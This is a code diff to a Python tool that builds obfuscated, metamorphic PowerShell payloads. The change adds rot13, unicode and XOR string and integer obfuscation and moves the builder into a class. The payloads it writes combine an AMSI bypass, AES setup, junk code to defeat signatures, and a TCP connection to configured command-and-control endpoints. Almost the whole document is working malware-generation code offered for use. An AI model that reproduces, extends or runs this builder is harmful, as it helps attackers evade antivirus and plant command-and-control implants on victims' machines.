@@ -8,6 +8,7 @@ import math
 import datetime
 import itertools
 import sys
+import codecs
 
 # Configuration
 C2_ENDPOINTS = [
@@ -64,7 +65,19 @@ def morph_name(base, min_len=8, max_len=20):
 
 # --- Enhanced String Obfuscation ---
 def obfuscate_string(s):
-    methods = ["b64", "hex", "chararray", "split", "format", "join", "concat", "reverse", "xor"]
+    methods = [
+        "b64",
+        "hex",
+        "chararray",
+        "split",
+        "format",
+        "join",
+        "concat",
+        "reverse",
+        "xor",
+        "rot13",
+        "unicode",
+    ]
     method = random.choice(methods)
     
     if method == "b64":
@@ -109,10 +122,16 @@ def obfuscate_string(s):
         key = random.randint(1, 255)
         xored = ''.join(chr(ord(c) ^ key) for c in s)
         return f"[System.Text.Encoding]::UTF8.GetString([byte[]]@({','.join(str(ord(c)) for c in xored)}))"
+    elif method == "rot13":
+        encoded = codecs.decode(s, "rot_13")
+        return f"Convert-Rot13 '{encoded}'"
+    elif method == "unicode":
+        encoded = ''.join(f"\\u{ord(c):04x}" for c in s)
+        return f"Convert-FromUnicode '{encoded}'"
 
 # --- Enhanced Integer Obfuscation ---
 def obfuscate_int(n):
-    methods = ["math", "hex", "str_parse", "split_sum"]
+    methods = ["math", "hex", "str_parse", "split_sum", "xor"]
     method = random.choice(methods)
     
     if method == "math":
@@ -131,6 +150,9 @@ def obfuscate_int(n):
             parts.append(str(part))
             left -= part
         return '+'.join(parts)
+    elif method == "xor":
+        mask = random.randint(1, 2**16)
+        return f"{n ^ mask} -bxor {mask}"
     return str(n)
 
 # --- Enhanced Junk Code Generation ---
@@ -238,126 +260,139 @@ try {{
     # Add junk code after for more metamorphism
     return selected + '\n' + random_junk_code()
 
-def generate_metamorphic_payload():
-    try:
-    filename = generate_unique_filename()
-    # Morph all variable names
-    vars = {k: morph_name(k) for k in [
-        'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 'sendbyte', 'encoding',
-        'readLength', 'aes', 'encryptor', 'iv', 'key', 'cmd', 'result', 'junk', 'junk2', 'junk3', 'success'
-    ]}
-        # AMSI bypass section
-        amsi_bypass = random_amsi_bypass()
-    # AES Setup with enhanced obfuscation
-    aes_key = base64.b64encode(os.urandom(32)).decode()
-    aes_iv = base64.b64encode(os.urandom(16)).decode()
-    aes = f"""
-    try {{
-            ${{vars['aes']}} = [System.Security.Cryptography.Aes]::Create()
-            ${{vars['aes']}}.Key = [Convert]::FromBase64String({obfuscate_string(aes_key)})
-            ${{vars['aes']}}.IV = [Convert]::FromBase64String({obfuscate_string(aes_iv)})
-            ${{vars['encryptor']}} = ${{vars['aes']}}.CreateDecryptor()
-    }} catch {{
-        $null
+
+class MetamorphicPayloadGenerator:
+    """Generate highly obfuscated PowerShell payloads with configurable options."""
+
+    def __init__(self, c2_endpoints=None, junk_range=(15, 25)):
+        self.c2_endpoints = c2_endpoints or C2_ENDPOINTS
+        self.junk_range = junk_range
+
+    def _helper_functions(self):
+        return """
+# Enhanced helper functions
+function Convert-StringToBytes {
+    param([string]$InputString)
+    [System.Text.Encoding]::UTF8.GetBytes($InputString)
+}
+
+function Convert-ToBase64 {
+    param([string]$InputString)
+    [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($InputString))
+}
+
+function Convert-FromBase64 {
+    param([string]$InputString)
+    [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($InputString))
+}
+
+function Convert-ToHex {
+    param([string]$InputString)
+    -join ($InputString.ToCharArray() | ForEach-Object { [string]::Format('{0:X2}', [int][char]$_) })
+}
+
+function Convert-FromHex {
+    param([string]$InputString)
+    -join ($InputString -split '(..)' | Where-Object { $_ } | ForEach-Object { [char][convert]::ToInt32($_, 16) })
+}
+
+function Convert-Rot13 {
+    param([string]$InputString)
+    $InputString.ToCharArray() | ForEach-Object {
+        if ([char]::IsLetter($_)) {
+            $base = if ([char]::IsUpper($_)) { [int][char]'A' } else { [int][char]'a' }
+            [char](([int][char]$_ - $base + 13) % 26 + $base)
+        } else { $_ }
+    } -join ''
+}
+
+function Convert-ToUnicode {
+    param([string]$InputString)
+    -join ($InputString.ToCharArray() | ForEach-Object { [string]::Format('\\u{{0:X4}}', [int][char]$_) })
+}
+
+function Convert-FromUnicode {
+    param([string]$InputString)
+    [System.Text.RegularExpressions.Regex]::Unescape($InputString)
+}
+
+function Convert-ToBinary {
+    param([string]$InputString)
+    -join ($InputString.ToCharArray() | ForEach-Object { [Convert]::ToString([int][char]$_, 2).PadLeft(8, '0') })
+}
+
+function Convert-FromBinary {
+    param([string]$InputString)
+    -join ($InputString -split '(........)' | Where-Object { $_ } | ForEach-Object { [char][Convert]::ToInt32($_, 2) })
+}
+
+"""
+
+    def generate(self):
+        try:
+            filename = generate_unique_filename()
+            vars = {k: morph_name(k) for k in [
+                'client', 'stream', 'bytes', 'data', 'sendback', 'sendback2', 'sendbyte', 'encoding',
+                'readLength', 'aes', 'encryptor', 'iv', 'key', 'cmd', 'result', 'junk', 'junk2', 'junk3', 'success'
+            ]}
+
+            amsi_bypass = random_amsi_bypass()
+            aes_key = base64.b64encode(os.urandom(32)).decode()
+            aes_iv = base64.b64encode(os.urandom(16)).decode()
+            aes = f"""
+try {{
+    ${{vars['aes']}} = [System.Security.Cryptography.Aes]::Create()
+    ${{vars['aes']}}.Key = [Convert]::FromBase64String({obfuscate_string(aes_key)})
+    ${{vars['aes']}}.IV = [Convert]::FromBase64String({obfuscate_string(aes_iv)})
+    ${{vars['encryptor']}} = ${{vars['aes']}}.CreateDecryptor()
+}} catch {{
+    $null
+}}
+"""
+
+            endpoints = ','.join(
+                [f'({obfuscate_string(h)}, {obfuscate_int(p)})' for h, p in self.c2_endpoints]
+            )
+            network = f"""
+try {{
+    ${{vars['client']}} = New-Object System.Net.Sockets.TCPClient
+    $endpoint = @( {endpoints} ) | Get-Random
+    ${{vars['result']}} = ${{vars['client']}}.BeginConnect($endpoint[0], $endpoint[1], $null, $null)
+    ${{vars['success']}} = ${{vars['result']}}.AsyncWaitHandle.WaitOne((Get-Random -Minimum {obfuscate_int(500)} -Maximum {obfuscate_int(2000)}), $false)
+    if (${{vars['success']}}) {{
+        ${{vars['client']}}.EndConnect(${{vars['result']}})
     }}
-    """
-    # Network Operations with enhanced obfuscation
-    network = f"""
-    try {{
-            ${{vars['client']}} = New-Object System.Net.Sockets.TCPClient
-        $endpoint = @(
-            {','.join([f'({obfuscate_string(host)}, {obfuscate_int(port)})' for host, port in C2_ENDPOINTS])}
-        ) | Get-Random
-            ${{vars['result']}} = ${{vars['client']}}.BeginConnect($endpoint[0], $endpoint[1], $null, $null)
-            ${{vars['success']}} = ${{vars['result']}}.AsyncWaitHandle.WaitOne((Get-Random -Minimum {obfuscate_int(500)} -Maximum {obfuscate_int(2000)}), $false)
-            if (${{vars['success']}}) {{
-                ${{vars['client']}}.EndConnect(${{vars['result']}})
-        }}
-            ${{vars['client']}}.Close()
-    }} catch {{
-        $null
-    }}
-    """
-        # Prepare all blocks except AMSI bypass
-    blocks = [aes, network]
-        # Insert more junk code randomly (but never before AMSI bypass)
-        for _ in range(random.randint(15, 25)):
-        idx = random.randint(0, len(blocks))
-        blocks.insert(idx, random_junk_code())
-    # Add error handling preference
-    code = "$ErrorActionPreference = 'SilentlyContinue'\n\n"
-    # Add enhanced helper functions
-    code += """
-    # Enhanced helper functions
-    function Convert-StringToBytes {
-        param([string]$InputString)
-        [System.Text.Encoding]::UTF8.GetBytes($InputString)
-    }
+    ${{vars['client']}}.Close()
+}} catch {{
+    $null
+}}
+"""
 
-    function Convert-ToBase64 {
-        param([string]$InputString)
-        [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($InputString))
-    }
+            blocks = [aes, network]
+            for _ in range(random.randint(*self.junk_range)):
+                idx = random.randint(0, len(blocks))
+                blocks.insert(idx, random_junk_code())
 
-    function Convert-FromBase64 {
-        param([string]$InputString)
-        [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($InputString))
-    }
+            code = "$ErrorActionPreference = 'SilentlyContinue'\n\n"
+            code += self._helper_functions()
+            code += amsi_bypass + '\n' + '\n'.join(blocks)
 
-    function Convert-ToHex {
-        param([string]$InputString)
-        -join ($InputString.ToCharArray() | ForEach-Object { [string]::Format('{0:X2}', [int][char]$_) })
-    }
+            with open(filename, 'w') as f:
+                f.write(code)
+            return filename
+        except Exception as e:
+            print(f"Error generating payload: {e}", file=sys.stderr)
+            error_filename = f"error_payload_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
+            with open(error_filename, 'w') as f:
+                f.write(f"# Error generating payload: {str(e)}\n")
+                f.write("Write-Host 'Failed to generate payload'\n")
+            return error_filename
 
-    function Convert-FromHex {
-        param([string]$InputString)
-        -join ($InputString -split '(..)' | Where-Object { $_ } | ForEach-Object { [char][convert]::ToInt32($_, 16) })
-    }
 
-    function Convert-Rot13 {
-        param([string]$InputString)
-        $InputString.ToCharArray() | ForEach-Object {
-            if ([char]::IsLetter($_)) {
-                $base = if ([char]::IsUpper($_)) { [int][char]'A' } else { [int][char]'a' }
-                [char](([int][char]$_ - $base + 13) % 26 + $base)
-            } else { $_ }
-        } -join ''
-    }
+def generate_metamorphic_payload(c2_endpoints=None, junk_count_range=(15, 25)):
+    generator = MetamorphicPayloadGenerator(c2_endpoints, junk_count_range)
+    return generator.generate()
 
-    function Convert-ToUnicode {
-        param([string]$InputString)
-        -join ($InputString.ToCharArray() | ForEach-Object { [string]::Format('\\u{{0:X4}}', [int][char]$_) })
-    }
-
-    function Convert-FromUnicode {
-        param([string]$InputString)
-        [System.Text.RegularExpressions.Regex]::Unescape($InputString)
-    }
-
-    function Convert-ToBinary {
-        param([string]$InputString)
-        -join ($InputString.ToCharArray() | ForEach-Object { [Convert]::ToString([int][char]$_, 2).PadLeft(8, '0') })
-    }
-
-    function Convert-FromBinary {
-        param([string]$InputString)
-        -join ($InputString -split '(........)' | Where-Object { $_ } | ForEach-Object { [char][Convert]::ToInt32($_, 2) })
-    }
-    \n\n"""
-        # Add AMSI bypass first, then all other blocks
-        code += amsi_bypass + '\n' + '\n'.join(blocks)
-    # Save with unique filename
-    with open(filename, 'w') as f:
-        f.write(code)
-    return filename
-    except Exception as e:
-        print(f"Error generating payload: {e}", file=sys.stderr)
-        # Create a basic error payload
-        error_filename = f"error_payload_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
-        with open(error_filename, 'w') as f:
-            f.write(f"# Error generating payload: {str(e)}\n")
-            f.write("Write-Host 'Failed to generate payload'\n")
-        return error_filename
 
 if __name__ == "__main__":
     try:
